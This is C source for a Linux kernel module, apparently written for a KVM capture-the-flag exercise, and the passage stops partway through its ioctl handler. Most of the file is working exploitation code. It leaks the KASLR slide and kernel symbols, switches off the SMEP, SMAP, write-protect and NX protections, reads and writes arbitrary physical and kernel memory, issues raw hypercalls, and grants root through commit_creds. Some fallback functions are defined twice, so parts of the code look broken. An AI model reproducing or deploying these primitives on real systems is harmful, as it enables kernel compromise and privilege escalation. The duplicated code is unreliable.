#include <linux/mm.h>
#include <linux/pgtable.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/ktime.h>
#include <linux/types.h>
#include <linux/byteorder/generic.h>
#include <linux/kvm_para.h>
#include <linux/page-flags.h>
#include <linux/pagemap.h>
#include <linux/kdev_t.h>
#include <linux/err.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <asm/io.h>
#include <asm/pgtable.h>

/* x86-specific includes */
#ifdef CONFIG_X86
#include <asm/tlbflush.h>
#include <asm/cacheflush.h>
#include <asm/processor.h>
/* Try to include set_memory header if available */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 12, 0)
#include <linux/set_memory.h>
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0)
#include <asm/set_memory.h>
#endif
#endif

#define DRIVER_NAME "kvm_probe_drv"
#define DEVICE_FILE_NAME "kvm_probe_dev"

#define VQ_PAGE_ORDER 0
#define VQ_PAGE_SIZE (1UL << (PAGE_SHIFT + VQ_PAGE_ORDER))
#define MAX_VQ_DESCS 256
#define MAX_SYMBOL_NAME 128

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KVM Probe Lab");
MODULE_DESCRIPTION("Kernel module for KVM exploitation");
MODULE_VERSION("3.2"); /* Version bump for NX control */

/* ========================================================================
 * Kernel Version Compatibility Macros
 * ======================================================================== */

/* class_create API changed in kernel 6.4 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
#define CLASS_CREATE_COMPAT(name) class_create(name)
#else
#define CLASS_CREATE_COMPAT(name) class_create(THIS_MODULE, name)
#endif

/* kallsyms_lookup_name is no longer exported in kernel 5.7+ */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;

static int kallsyms_lookup_init(void) {
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };

    if (register_kprobe(&kp) < 0) {
        printk(KERN_ERR "%s: Failed to register kprobe for kallsyms_lookup_name\n", DRIVER_NAME);
        return -1;
    }

    kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
    unregister_kprobe(&kp);

    if (!kallsyms_lookup_name_ptr) {
        printk(KERN_ERR "%s: Could not find kallsyms_lookup_name\n", DRIVER_NAME);
        return -1;
    }

    return 0;
}

#define KALLSYMS_LOOKUP_NAME(name) kallsyms_lookup_name_ptr(name)
#else
#define KALLSYMS_LOOKUP_NAME(name) kallsyms_lookup_name(name)
static int kallsyms_lookup_init(void) { return 0; }
#endif

/* sync_core definition for non-x86 architectures */
#ifndef CONFIG_X86
#define sync_core() mb()
#endif

/* ========================================================================
 * KASLR Slide Detection & Address Translation
 * ======================================================================== */

static unsigned long g_kaslr_slide = 0;
static unsigned long g_kernel_text_base = 0;
static unsigned long g_kernel_base = 0;
static bool g_kaslr_initialized = false;

/* Important kernel symbols we'll cache */
static unsigned long g_symbol_commit_creds = 0;
static unsigned long g_symbol_prepare_kernel_cred = 0;
static unsigned long g_symbol_init_task = 0;
static unsigned long g_symbol_swapper_pg_dir = 0;
static unsigned long g_symbol_init_mm = 0;
static unsigned long g_symbol_write_flag = 0;

/* Initialize KASLR slide and detect kernel base properly */
static int init_kaslr_slide(void) {
    unsigned long stext_addr = 0;
    unsigned long _text_addr = 0;

#if IS_ENABLED(CONFIG_KALLSYMS)
    /* Try multiple symbols to be robust */
    stext_addr = KALLSYMS_LOOKUP_NAME("_stext");
    if (!stext_addr) {
        stext_addr = KALLSYMS_LOOKUP_NAME("stext");
    }

    _text_addr = KALLSYMS_LOOKUP_NAME("_text");
    if (!_text_addr) {
        _text_addr = KALLSYMS_LOOKUP_NAME("text");
    }

    /* Use the first available symbol */
    if (stext_addr) {
        g_kernel_text_base = stext_addr;
    } else if (_text_addr) {
        g_kernel_text_base = _text_addr;
    } else {
        printk(KERN_WARNING "%s: Could not find kernel text symbols\n", DRIVER_NAME);
        return -ENOENT;
    }

    /* Calculate KASLR slide from kernel text */
    g_kaslr_slide = g_kernel_text_base - 0xffffffff80000000UL;

    /* Kernel base is typically PAGE_OFFSET + slide */
    g_kernel_base = (unsigned long)PAGE_OFFSET + g_kaslr_slide;

    g_kaslr_initialized = true;

    printk(KERN_INFO "%s: Kernel text base: 0x%lx\n", DRIVER_NAME, g_kernel_text_base);
    printk(KERN_INFO "%s: KASLR slide: 0x%lx\n", DRIVER_NAME, g_kaslr_slide);
    printk(KERN_INFO "%s: Kernel base: 0x%lx\n", DRIVER_NAME, g_kernel_base);

    return 0;
#else
    printk(KERN_WARNING "%s: KALLSYMS not enabled, KASLR detection may not work\n", DRIVER_NAME);
    return -ENOENT;
#endif
}

/* Cache important kernel symbols */
static int cache_important_symbols(void) {
#if IS_ENABLED(CONFIG_KALLSYMS)
    g_symbol_commit_creds = KALLSYMS_LOOKUP_NAME("commit_creds");
    g_symbol_prepare_kernel_cred = KALLSYMS_LOOKUP_NAME("prepare_kernel_cred");
    g_symbol_init_task = KALLSYMS_LOOKUP_NAME("init_task");
    g_symbol_swapper_pg_dir = KALLSYMS_LOOKUP_NAME("swapper_pg_dir");
    g_symbol_init_mm = KALLSYMS_LOOKUP_NAME("init_mm");
    g_symbol_write_flag = KALLSYMS_LOOKUP_NAME("write_flag"); /* CTF specific */

    printk(KERN_INFO "%s: Cached symbols:\n", DRIVER_NAME);
    printk(KERN_INFO "  commit_creds: 0x%lx\n", g_symbol_commit_creds);
    printk(KERN_INFO "  prepare_kernel_cred: 0x%lx\n", g_symbol_prepare_kernel_cred);
    printk(KERN_INFO "  init_task: 0x%lx\n", g_symbol_init_task);
    printk(KERN_INFO "  swapper_pg_dir: 0x%lx\n", g_symbol_swapper_pg_dir);
    printk(KERN_INFO "  init_mm: 0x%lx\n", g_symbol_init_mm);
    printk(KERN_INFO "  write_flag: 0x%lx\n", g_symbol_write_flag);

    return 0;
#else
    return -ENOENT;
#endif
}

/* Convert unslid address to actual runtime address - IMPROVED VERSION */
static inline unsigned long apply_kaslr_slide(unsigned long unslid_addr) {
    if (!g_kaslr_initialized) {
        return unslid_addr; /* Fallback if not initialized */
    }

    /* Handle kernel text addresses */
    if (unslid_addr >= 0xffffffff80000000UL && unslid_addr < 0xffffffffa0000000UL) {
        return unslid_addr + g_kaslr_slide;
    }

    /* Handle direct mapping area */
    if (unslid_addr >= (unsigned long)PAGE_OFFSET) {
        return unslid_addr; /* Already in direct mapping */
    }

    /* Handle module addresses */
    if (unslid_addr >= 0xffffffffa0000000UL) {
        return unslid_addr; /* Module space usually doesn't have KASLR */
    }

    /* Small offset - assume relative to kernel base */
    if (unslid_addr < 0x1000000UL) {
        return g_kernel_base + unslid_addr;
    }

    /* Unknown - return as-is */
    return unslid_addr;
}

static inline bool is_kernel_address(unsigned long addr) {
    return (addr >= (unsigned long)PAGE_OFFSET) ||
           (addr >= 0xffffffff80000000UL && addr <= 0xffffffffffffffffUL);
}

/* Lookup symbol by name with automatic KASLR handling */
static unsigned long lookup_symbol(const char *name) {
    unsigned long addr = 0;

    #if IS_ENABLED(CONFIG_KALLSYMS)
        addr = KALLSYMS_LOOKUP_NAME(name);
        if (addr) {
            printk(KERN_DEBUG "%s: Symbol '%s' = 0x%lx\n", DRIVER_NAME, name, addr);
        } else {
            printk(KERN_DEBUG "%s: Symbol '%s' not found\n", DRIVER_NAME, name);
        }
    #endif

    return addr;
}

/* ========================================================================
 * Memory Protection Functions - with fallbacks
 * ======================================================================== */

/* Check if set_memory functions are available */
#if defined(CONFIG_X86) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0))
#define HAS_SET_MEMORY_FUNCS 1

/* Wrappers for set_memory functions */
static inline int my_set_memory_rw(unsigned long addr, int numpages) {
    return set_memory_rw(addr, numpages);
}

static inline int my_set_memory_ro(unsigned long addr, int numpages) {
    return set_memory_ro(addr, numpages);
}

#else
#define HAS_SET_MEMORY_FUNCS 0

/* Helper function for page table walking */
static pte_t *lookup_address(unsigned long address, unsigned int *level) {
#ifdef CONFIG_X86
    pgd_t *pgd;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;

    *level = PG_LEVEL_NONE;

    pgd = pgd_offset_k(address);
    if (pgd_none(*pgd))
        return NULL;

    pud = pud_offset(pgd, address);
    if (pud_none(*pud))
        return NULL;
    if (pud_large(*pud)) {
        *level = PG_LEVEL_1G;
        return (pte_t *)pud;
    }

    pmd = pmd_offset(pud, address);
    if (pmd_none(*pmd))
        return NULL;
    if (pmd_large(*pmd)) {
        *level = PG_LEVEL_2M;
        return (pte_t *)pmd;
    }

    pte = pte_offset_kernel(pmd, address);
    if (pte_none(*pte))
        return NULL;

    *level = PG_LEVEL_4K;
    return pte;
#else
    return NULL;
#endif
}

/* Fallback: use direct page table manipulation */
static inline int my_set_memory_rw(unsigned long addr, int numpages) {
    unsigned long i;
    pte_t *ptep;
    unsigned int level;

    for (i = 0; i < numpages; i++) {
        ptep = lookup_address(addr + (i * PAGE_SIZE), &level);
        if (!ptep) {
            return -EINVAL;
        }

        /* Set writable bit */
        set_pte(ptep, pte_mkwrite(*ptep));
    }

    /* Flush TLB */
    flush_tlb_all();
    return 0;
}

static inline int my_set_memory_ro(unsigned long addr, int numpages) {
    unsigned long i;
    pte_t *ptep;
    unsigned int level;

    for (i = 0; i < numpages; i++) {
        ptep = lookup_address(addr + (i * PAGE_SIZE), &level);
        if (!ptep) {
            return -EINVAL;
        }

        /* Clear writable bit */
        set_pte(ptep, pte_wrprotect(*ptep));
    }

    /* Flush TLB */
    flush_tlb_all();
    return 0;
}
#endif  /* <-- THIS WAS MISSING! */
#if !defined(HAS_SET_MEMORY_FUNCS) || !HAS_SET_MEMORY_FUNCS
/* Fallback: use direct page table manipulation */
static inline int my_set_memory_rw(unsigned long addr, int numpages) {
    unsigned long i;
    pte_t *ptep;
    unsigned int level;

    for (i = 0; i < numpages; i++) {
        ptep = lookup_address(addr + (i * PAGE_SIZE), &level);
        if (!ptep) {
            return -EINVAL;
        }

        /* Set writable bit */
        set_pte(ptep, pte_mkwrite(*ptep));
        /* Also clear read-only bit if needed */
        set_pte(ptep, pte_mkwrite(pte_mkdirty(*ptep)));
    }

    /* Flush TLB */
    flush_tlb_all();
    return 0;
}

static inline int my_set_memory_ro(unsigned long addr, int numpages) {
    unsigned long i;
    pte_t *ptep;
    unsigned int level;

    for (i = 0; i < numpages; i++) {
        ptep = lookup_address(addr + (i * PAGE_SIZE), &level);
        if (!ptep) {
            return -EINVAL;
        }

        /* Clear writable bit */
        set_pte(ptep, pte_wrprotect(*ptep));
    }

    /* Flush TLB */
    flush_tlb_all();
    return 0;
}
#endif

/* ========================================================================
 * Extreme KVMCTF Exploitation Primitives - FIXED VERSION
 * ======================================================================== */

/* Add these global variables */
static unsigned long g_original_cr4 = 0;
static unsigned long g_original_cr0 = 0;
static bool g_smep_disabled = false;
static bool g_smap_disabled = false;
static bool g_wp_disabled = false;
static bool g_nx_enabled = false;
static u64 g_original_efer = 0;

/* EFER MSR number and bit definitions */
#define MSR_EFER 0xC0000080
#define EFER_NXE (1 << 11)  /* No-Execute Enable */

/* Extreme Exploitation Helpers (KVMCTF ONLY) */
#ifdef CONFIG_X86
/* Read CR4 register */
static inline unsigned long my_read_cr4(void) {
    unsigned long cr4;
    asm volatile("mov %%cr4, %0" : "=r"(cr4));
    return cr4;
}

/* Write CR4 register */
static inline void my_write_cr4(unsigned long cr4) {
    asm volatile("mov %0, %%cr4" : : "r"(cr4) : "memory");
}

/* Read CR0 register */
static inline unsigned long my_read_cr0(void) {
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    return cr0;
}

/* Write CR0 register */
static inline void my_write_cr0(unsigned long cr0) {
    asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
}

/* Read MSR - use different name to avoid conflict */
static inline u64 my_rdmsr(u32 msr) {
    u32 low, high;
    asm volatile("rdmsr" : "=a"(low), "=d"(high) : "c"(msr));
    return ((u64)high << 32) | low;
}

/* Write MSR - use different name to avoid conflict */
static inline void my_wrmsr(u32 msr, u64 value) {
    u32 low = value & 0xffffffff;
    u32 high = value >> 32;
    asm volatile("wrmsr" : : "c"(msr), "a"(low), "d"(high));
}
#endif

/* Disable SMEP by clearing bit 20 of CR4 */
static void disable_smep(void) {
#ifdef CONFIG_X86
    unsigned long current_cr4 = my_read_cr4();
    g_original_cr4 = current_cr4;  // Save original
    unsigned long new_cr4 = current_cr4 & ~(1UL << 20);  // Clear SMEP bit (20)
    my_write_cr4(new_cr4);
    g_smep_disabled = true;
    printk(KERN_WARNING "%s: SMEP DISABLED! (CR4: 0x%lx -> 0x%lx)\n",
           DRIVER_NAME, current_cr4, new_cr4);
#endif
}

/* Enable SMEP by setting bit 20 of CR4 */
static void enable_smep(void) {
#ifdef CONFIG_X86
    unsigned long current_cr4 = my_read_cr4();
    unsigned long new_cr4 = current_cr4 | (1UL << 20);  // Set SMEP bit (20)
    my_write_cr4(new_cr4);
    g_smep_disabled = false;
    printk(KERN_WARNING "%s: SMEP ENABLED! (CR4: 0x%lx -> 0x%lx)\n",
           DRIVER_NAME, current_cr4, new_cr4);
#endif
}

/* Disable SMAP by clearing bit 21 of CR4 */
static void disable_smap(void) {
#ifdef CONFIG_X86
    unsigned long current_cr4 = my_read_cr4();
    g_original_cr4 = current_cr4;  // Save original
    unsigned long new_cr4 = current_cr4 & ~(1UL << 21);  // Clear SMAP bit (21)
    my_write_cr4(new_cr4);
    g_smap_disabled = true;
    printk(KERN_WARNING "%s: SMAP DISABLED! (CR4: 0x%lx -> 0x%lx)\n",
           DRIVER_NAME, current_cr4, new_cr4);
#endif
}

/* Enable SMAP by setting bit 21 of CR4 */
static void enable_smap(void) {
#ifdef CONFIG_X86
    unsigned long current_cr4 = my_read_cr4();
    unsigned long new_cr4 = current_cr4 | (1UL << 21);  // Set SMAP bit (21)
    my_write_cr4(new_cr4);
    g_smap_disabled = false;
    printk(KERN_WARNING "%s: SMAP ENABLED! (CR4: 0x%lx -> 0x%lx)\n",
           DRIVER_NAME, current_cr4, new_cr4);
#endif
}

/* Disable Write Protect by clearing bit 16 of CR0 */
static void disable_wp(void) {
#ifdef CONFIG_X86
    unsigned long current_cr0 = my_read_cr0();
    g_original_cr0 = current_cr0;  // Save original
    unsigned long new_cr0 = current_cr0 & ~(1UL << 16);  // Clear WP bit (16)
    my_write_cr0(new_cr0);
    g_wp_disabled = true;
    printk(KERN_WARNING "%s: WP DISABLED! (CR0: 0x%lx -> 0x%lx)\n",
           DRIVER_NAME, current_cr0, new_cr0);
#endif
}

/* Enable Write Protect by setting bit 16 of CR0 */
static void enable_wp(void) {
#ifdef CONFIG_X86
    unsigned long current_cr0 = my_read_cr0();
    unsigned long new_cr0 = current_cr0 | (1UL << 16);  // Set WP bit (16)
    my_write_cr0(new_cr0);
    g_wp_disabled = false;
    printk(KERN_WARNING "%s: WP ENABLED! (CR0: 0x%lx -> 0x%lx)\n",
           DRIVER_NAME, current_cr0, new_cr0);
#endif
}

/* Enable NX by setting EFER.NXE bit */
static void enable_nx(void) {
#ifdef CONFIG_X86
    u64 current_efer;

    /* Save original only if not already saved */
    if (!g_original_efer) {
        current_efer = my_rdmsr(MSR_EFER);
        g_original_efer = current_efer;
    } else {
        current_efer = my_rdmsr(MSR_EFER);
    }

    if (!(current_efer & EFER_NXE)) {
        u64 new_efer = current_efer | EFER_NXE;  // Set NXE bit (11)
        my_wrmsr(MSR_EFER, new_efer);
        g_nx_enabled = true;
        printk(KERN_WARNING "%s: NX ENABLED! (EFER: 0x%llx -> 0x%llx)\n",
               DRIVER_NAME, current_efer, new_efer);
    }
#endif
}

/* Disable NX by clearing EFER.NXE bit */
static void disable_nx(void) {
#ifdef CONFIG_X86
    u64 current_efer = my_rdmsr(MSR_EFER);
    u64 new_efer = current_efer & ~EFER_NXE;  // Clear NXE bit (11)
    my_wrmsr(MSR_EFER, new_efer);
    g_nx_enabled = false;
    printk(KERN_WARNING "%s: NX DISABLED! (EFER: 0x%llx -> 0x%llx)\n",
           DRIVER_NAME, current_efer, new_efer);
#endif
}

/* Read CR0 register - renamed to avoid conflict */
static void my_read_cr0_debug(void) {
#ifdef CONFIG_X86
    unsigned long cr0 = my_read_cr0();
    printk(KERN_INFO "%s: CR0 = 0x%lx\n", DRIVER_NAME, cr0);
    printk(KERN_INFO "%s: CR0.WP (bit 16) = %d\n",
           DRIVER_NAME, (cr0 & (1UL << 16)) ? 1 : 0);
#endif
}

/* Check current protection status */
static void check_protection_status(void) {
#ifdef CONFIG_X86
    unsigned long cr0 = my_read_cr0();
    unsigned long cr4 = my_read_cr4();
    u64 efer = my_rdmsr(MSR_EFER);

    printk(KERN_INFO "%s: === PROTECTION STATUS ===\n", DRIVER_NAME);
    printk(KERN_INFO "%s: CR0: 0x%lx\n", DRIVER_NAME, cr0);
    printk(KERN_INFO "%s: CR0.WP (bit 16): %s\n",
           DRIVER_NAME, (cr0 & (1UL << 16)) ? "ENABLED" : "DISABLED");
    printk(KERN_INFO "%s: CR4: 0x%lx\n", DRIVER_NAME, cr4);
    printk(KERN_INFO "%s: CR4.SMEP (bit 20): %s\n",
           DRIVER_NAME, (cr4 & (1UL << 20)) ? "ENABLED" : "DISABLED");
    printk(KERN_INFO "%s: CR4.SMAP (bit 21): %s\n",
           DRIVER_NAME, (cr4 & (1UL << 21)) ? "ENABLED" : "DISABLED");
    printk(KERN_INFO "%s: EFER: 0x%llx\n", DRIVER_NAME, efer);
    printk(KERN_INFO "%s: EFER.NXE (bit 11): %s\n",
           DRIVER_NAME, (efer & EFER_NXE) ? "ENABLED" : "DISABLED");
#endif
}

/* Restore original protection */
static void restore_protections(void) {
#ifdef CONFIG_X86
    if (g_smep_disabled || g_smap_disabled) {
        my_write_cr4(g_original_cr4);
        printk(KERN_INFO "%s: CR4 protections restored (CR4: 0x%lx)\n",
               DRIVER_NAME, g_original_cr4);
        g_smep_disabled = false;
        g_smap_disabled = false;
    }
    if (g_wp_disabled) {
        my_write_cr0(g_original_cr0);
        printk(KERN_INFO "%s: WP restored (CR0: 0x%lx)\n",
               DRIVER_NAME, g_original_cr0);
        g_wp_disabled = false;
    }
    if (g_nx_enabled) {
        my_wrmsr(MSR_EFER, g_original_efer);
        printk(KERN_INFO "%s: NX restored to original state (EFER: 0x%llx)\n",
               DRIVER_NAME, g_original_efer);
        g_nx_enabled = false;
    }
#endif
}

/* Privilege escalation primitive */
static void escalate_privileges(void) {
#if IS_ENABLED(CONFIG_KALLSYMS)
    if (g_symbol_commit_creds && g_symbol_prepare_kernel_cred) {
        typedef void* (*prepare_kernel_cred_t)(void*);
        typedef int (*commit_creds_t)(void*);

        prepare_kernel_cred_t prepare_kernel_cred =
            (prepare_kernel_cred_t)g_symbol_prepare_kernel_cred;
        commit_creds_t commit_creds =
            (commit_creds_t)g_symbol_commit_creds;

        void *cred = prepare_kernel_cred(0);
        if (cred) {
            commit_creds(cred);
            printk(KERN_WARNING "%s: PRIVILEGES ESCALATED!\n", DRIVER_NAME);
        }
    }
#endif
}

/* Read physical memory directly */
static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size) {
    void __iomem *mem;

    mem = ioremap(phys_addr, size);
    if (!mem) {
        return -EFAULT;
    }

    memcpy_fromio(buffer, mem, size);
    iounmap(mem);
    return 0;
}

/* Write physical memory directly */
static int write_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size) {
    void __iomem *mem;

    mem = ioremap(phys_addr, size);
    if (!mem) {
        return -EFAULT;
    }

    memcpy_toio(mem, buffer, size);
    iounmap(mem);
    return 0;
}

/* Allocate pages and map them as root */
static int alloc_root_pages(unsigned long __user *user_pages, int count) {
    struct page **pages;
    int i;

    if (count <= 0 || count > 16) {
        return -EINVAL;
    }

    pages = kmalloc_array(count, sizeof(struct page *), GFP_KERNEL);
    if (!pages) {
        return -ENOMEM;
    }

    for (i = 0; i < count; i++) {
        pages[i] = alloc_page(GFP_KERNEL);
        if (!pages[i]) {
            /* Free allocated pages on failure */
            while (i-- > 0) {
                __free_page(pages[i]);
            }
            kfree(pages);
            return -ENOMEM;
        }

        /* Return physical address to user */
        unsigned long phys = page_to_phys(pages[i]);
        if (copy_to_user(&user_pages[i], &phys, sizeof(phys))) {
            /* Free all pages on copy failure */
            for (int j = 0; j <= i; j++) {
                __free_page(pages[j]);
            }
            kfree(pages);
            return -EFAULT;
        }
    }

    kfree(pages);
    return 0;
}

/* ========================================================================
 * Global Variables
 * ======================================================================== */

static int major_num = -1;
static struct class* driver_class = NULL;
static struct device* driver_device = NULL;

static void *g_vq_virt_addr = NULL;
static dma_addr_t g_vq_phys_addr = 0;
static unsigned long g_vq_pfn = 0;

/* ========================================================================
 * Structure Definitions
 * ======================================================================== */

struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char __user *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

struct vring_desc_kernel {
    __le64 addr;
    __le32 len;
    __le16 flags;
    __le16 next;
};

struct vq_desc_user_data {
    u16 index;
    u64 phys_addr;
    u32 len;
    u16 flags;
    u16 next_idx;
};

struct kvm_kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buf;
};

struct va_scan_data {
    unsigned long va;
    unsigned long size;
    unsigned char __user *user_buffer;
};

struct va_write_data {
    unsigned long va;
    unsigned long size;
    unsigned char __user *user_buffer;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
};

struct patch_req {
    unsigned long dst_va;
    unsigned long size;
    unsigned char __user *user_buf;
};

struct symbol_lookup {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
};

struct msr_data {
    unsigned int msr;
    unsigned long long value;
};

struct physical_rw {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char __user *user_buffer;
};

struct exploit_primitive {
    unsigned long target;
    unsigned long value;
    unsigned long size;
    unsigned char __user *user_buffer;
};

/* ========================================================================
 * IOCTL Command Definitions
 * ======================================================================== */

#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_ALLOC_VQ_PAGE      0x1005
#define IOCTL_FREE_VQ_PAGE       0x1006
#define IOCTL_WRITE_VQ_DESC      0x1007
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_PATCH_INSTRUCTIONS 0x100B
#define IOCTL_READ_FLAG_ADDR     0x100C
#define IOCTL_WRITE_FLAG_ADDR    0x100D
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_LOOKUP_SYMBOL      0x1013
#define IOCTL_GET_KERNEL_BASE    0x1014
#define IOCTL_DISABLE_SMEP       0x1015
#define IOCTL_DISABLE_SMAP       0x1016
#define IOCTL_DISABLE_WP         0x1017
#define IOCTL_READ_CR4           0x1018
#define IOCTL_WRITE_CR4          0x1019
#define IOCTL_READ_MSR           0x101A
#define IOCTL_WRITE_MSR          0x101B
#define IOCTL_GET_CURRENT_TASK   0x101C
#define IOCTL_ESCALATE_PRIVILEGES 0x101D
#define IOCTL_READ_PHYSICAL      0x101E
#define IOCTL_WRITE_PHYSICAL     0x101F
#define IOCTL_ALLOC_ROOT_PAGES   0x1020
#define IOCTL_ENABLE_NX          0x1021
#define IOCTL_DISABLE_NX         0x1022
#define IOCTL_READ_EFER          0x1023
#define IOCTL_WRITE_EFER         0x1024
#define IOCTL_ENABLE_SMEP        0x1025
#define IOCTL_ENABLE_SMAP        0x1026
#define IOCTL_ENABLE_WP          0x1027
#define IOCTL_READ_CR0           0x1028
#define IOCTL_WRITE_CR0          0x1029
#define IOCTL_CHECK_STATUS       0x102A

/* ========================================================================
 * Helper Functions - QUIET VERSION
 * ======================================================================== */

static long force_hypercall(void) {
    long ret;
    u64 start = ktime_get_ns();
    ret = kvm_hypercall0(KVM_HC_VAPIC_POLL_IRQ);
    u64 end = ktime_get_ns();

    /* Only log hypercalls if they return non-zero (interesting) */
    if (ret != 0) {
        printk(KERN_DEBUG "%s: HYPERCALL returned non-zero | latency=%llu ns | ret=%ld\n",
               DRIVER_NAME, end - start, ret);
    }
    return ret;
}

static long do_hypercall(struct hypercall_args *args) {
    unsigned long nr = args->nr;
    unsigned long a0 = args->arg0;
    unsigned long a1 = args->arg1;
    unsigned long a2 = args->arg2;
    unsigned long a3 = args->arg3;

    long ret;
    u64 start = ktime_get_ns();

    if (a0 == 0 && a1 == 0 && a2 == 0 && a3 == 0) {
        ret = kvm_hypercall0(nr);
    } else if (a1 == 0 && a2 == 0 && a3 == 0) {
        ret = kvm_hypercall1(nr, a0);
    } else if (a2 == 0 && a3 == 0) {
        ret = kvm_hypercall2(nr, a0, a1);
    } else if (a3 == 0) {
        ret = kvm_hypercall3(nr, a0, a1, a2);
    } else {
        ret = kvm_hypercall4(nr, a0, a1, a2, a3);
    }

    u64 end = ktime_get_ns();

    /* Only log hypercalls if they return non-zero */
    if (ret != 0) {
        printk(KERN_DEBUG "%s: HYPERCALL(%lu) returned non-zero | latency=%llu ns | ret=%ld\n",
               DRIVER_NAME, nr, end - start, ret);
    }
    return ret;
}

/* ========================================================================
 * IOCTL Handler - QUIET VERSION
 * ======================================================================== */

static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    struct port_io_data p_io_data_kernel;
    struct mmio_data m_io_data_kernel;
    void __iomem *mapped_addr = NULL;
    unsigned long len_to_copy;
    unsigned char *k_mmio_buffer = NULL;

    /* Only log IOCTL for important/extreme operations */
    switch (cmd) {
        case IOCTL_DISABLE_SMEP:
        case IOCTL_DISABLE_SMAP:
        case IOCTL_DISABLE_WP:
        case IOCTL_ENABLE_NX:
        case IOCTL_DISABLE_NX:
        case IOCTL_LOOKUP_SYMBOL:
        case IOCTL_GET_KASLR_SLIDE:
        case IOCTL_GET_KERNEL_BASE:
        case IOCTL_WRITE_CR4:
        case IOCTL_WRITE_MSR:
        case IOCTL_WRITE_EFER:
        case IOCTL_WRITE_PHYSICAL:
        case IOCTL_WRITE_KERNEL_MEM:
        case IOCTL_ENABLE_SMEP:
        case IOCTL_ENABLE_SMAP:
        case IOCTL_ENABLE_WP:
        case IOCTL_WRITE_CR0:
        case IOCTL_ESCALATE_PRIVILEGES:
            printk(KERN_DEBUG "%s: IOCTL cmd=0x%x\n", DRIVER_NAME, cmd);
            break;
        default:
            /* Don't log routine IOCTLs */
            break;
    }

    switch (cmd) {

        case IOCTL_LOOKUP_SYMBOL: {
            struct symbol_lookup req;

            if (copy_from_user(&req, (struct symbol_lookup __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            /* Ensure null termination */
            req.name[MAX_SYMBOL_NAME - 1] = '\0';

            printk(KERN_DEBUG "%s: Looking up symbol '%s'\n", DRIVER_NAME, req.name);

            /* Look up the symbol using kallsyms */
            req.address = lookup_symbol(req.name);

            if (req.address == 0) {
                printk(KERN_WARNING "%s: Symbol '%s' not found\n", DRIVER_NAME, req.name);
                return -ENOENT;
            }

            printk(KERN_INFO "%s: Symbol '%s' resolved to 0x%lx\n",
                   DRIVER_NAME, req.name, req.address);

            /* Return address to userspace */
            if (copy_to_user((struct symbol_lookup __user *)arg, &req, sizeof(req))) {
                return -EFAULT;
            }

            return 0;
        }

        case IOCTL_GET_KASLR_SLIDE: {
            printk(KERN_DEBUG "%s: GET_KASLR_SLIDE called\n", DRIVER_NAME);
            if (copy_to_user((unsigned long __user *)arg, &g_kaslr_slide, sizeof(g_kaslr_slide))) {
                return -EFAULT;
            }
            return 0;
        }

        case IOCTL_GET_KERNEL_BASE: {
            printk(KERN_DEBUG "%s: GET_KERNEL_BASE called\n", DRIVER_NAME);
            if (copy_to_user((unsigned long __user *)arg, &g_kernel_base, sizeof(g_kernel_base))) {
                return -EFAULT;
            }
            return 0;
        }
        case IOCTL_READ_PORT:
            if (copy_from_user(&p_io_data_kernel, (struct port_io_data __user *)arg, sizeof(p_io_data_kernel))) {
                return -EFAULT;
            }
            if (p_io_data_kernel.size != 1 && p_io_data_kernel.size != 2 && p_io_data_kernel.size != 4) {
                return -EINVAL;
            }
            switch (p_io_data_kernel.size) {
                case 1: p_io_data_kernel.value = inb(p_io_data_kernel.port); break;
                case 2: p_io_data_kernel.value = inw(p_io_data_kernel.port); break;
                case 4: p_io_data_kernel.value = inl(p_io_data_kernel.port); break;
            }
            if (copy_to_user((struct port_io_data __user *)arg, &p_io_data_kernel, sizeof(p_io_data_kernel))) {
                return -EFAULT;
            }
            force_hypercall(); /* Quiet version */
            break;

        case IOCTL_WRITE_PORT:
            if (copy_from_user(&p_io_data_kernel, (struct port_io_data __user *)arg, sizeof(p_io_data_kernel))) {
                return -EFAULT;
            }
            if (p_io_data_kernel.size != 1 && p_io_data_kernel.size != 2 && p_io_data_kernel.size != 4) {
                return -EINVAL;
            }
